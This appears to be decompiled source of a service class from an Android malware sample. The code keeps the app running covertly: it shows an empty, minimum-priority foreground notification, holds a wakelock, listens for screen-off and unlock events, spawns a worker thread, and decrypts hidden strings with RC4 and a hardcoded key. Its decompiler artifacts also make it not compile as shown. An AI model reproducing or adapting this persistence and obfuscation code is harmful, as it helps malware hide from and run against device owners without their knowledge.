package com.example.mmm.Service;

import com.example.mmm.Utils.*;
import com.example.mmm.*;
import android.app.*;
import android.annotation.*;
import com.example.mmm.API.*;
import android.util.*;
import android.content.*;
import android.os.*;
import com.example.mmm.unmapped.*;

public class srvAntiSleep extends Service
{
    utils utl;
    constants consts;
    private boolean bargain$;
    private srvAntiSleep$Receiver length$;
    private PowerManager$WakeLock wakeLock;
    
    public srvAntiSleep() {
        super();
        this.utl = new utils();
        this.consts = new constants();
        this.bargain$ = false;
        this.wakeLock = null;
    }
    
    @TargetApi(16)
    @TargetApi(16)
    private Notification a() {
        final int sdk_INT = Build$VERSION.SDK_INT;
        final String s = "ENDLESS";
        if (sdk_INT >= 26) {
            final NotificationManager notificationManager = (NotificationManager)this.getSystemService("notification");
            final NotificationChannel notificationChannel = new NotificationChannel(s, (CharSequence)" ", 4);
            notificationChannel.setDescription("");
            notificationChannel.enableLights(true);
            notificationChannel.setLightColor(-1);
            notificationChannel.enableVibration(false);
            notificationManager.createNotificationChannel(notificationChannel);
        }
        final PendingIntent activity = PendingIntent.getActivity((Context)this, 0, new Intent((Context)this, (Class)mainActivity.class), 0);
        Notification$Builder notification$Builder;
        if (Build$VERSION.SDK_INT >= 26) {
            notification$Builder = new Notification$Builder((Context)this, s);
        }
        else {
            notification$Builder = new Notification$Builder((Context)this);
        }
        return notification$Builder.setContentTitle((CharSequence)"").setContentIntent(activity).setSmallIcon(2130837504).setPriority(-2).build();
    }
    
    static boolean a(final srvAntiSleep srvAntiSleep) {
        return srvAntiSleep.bargain$;
    }
    
    public final String decrypt_str(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    public IBinder onBind(final Intent \u0131ntent) {
        this.utl.Log("EndLess", "Some component want to bind with the service");
        return null;
    }
    
    public void onCreate() {
        super.onCreate();
        this.utl.Log("EndLess", "The service has been created".toUpperCase());
        this.length$ = new srvAntiSleep$Receiver(this, (byte)0);
        final IntentFilter \u0131ntentFilter = new IntentFilter();
        \u0131ntentFilter.addAction("android.intent.action.SCREEN_OFF");
        \u0131ntentFilter.addAction("android.intent.action.USER_PRESENT");
        this.registerReceiver((BroadcastReceiver)this.length$, \u0131ntentFilter);
        this.startForeground(1, this.a());
    }
    
    public void onDestroy() {
        super.onDestroy();
        if (this.length$ != null) {
            this.unregisterReceiver((BroadcastReceiver)this.length$);
        }
        this.utl.Log("EndLess", "The service has been destroyed".toUpperCase());
    }
    
    public int onStartCommand(final Intent \u0131ntent, final int n, final int n2) {
        final utils utl = this.utl;
        final String s = "EndLess";
        final StringBuilder sb = new StringBuilder();
        sb.append("onStartCommand executed with startId: ");
        sb.append(n2);
        utl.Log(s, sb.toString());
        if (\u0131ntent != null) {
            if (\u0131ntent.getAction().equals("start")) {
                if (!this.bargain$) {
                    this.utl.Log("EndLess", "Starting the foreground service task");
                    this.bargain$ = true;
                    this.utl.SettingsWrite((Context)this, "EL", "start");
                    if (this.wakeLock == null) {
                        ((PowerManager)this.getSystemService("power")).newWakeLock(1, this.getClass().getName()).acquire();
                    }
                    new Thread(new Willie(this)).start();
                    return 1;
                }
            }
            else {
                this.utl.Log("EndLess", "Stopping the foreground service");
                if (this.wakeLock != null && this.wakeLock.isHeld()) {
                    this.wakeLock.release();
                }
                this.stopForeground(true);
                this.stopSelf();
                this.bargain$ = false;
                this.utl.SettingsWrite((Context)this, "EL", "");
            }
        }
        return 1;
    }
}
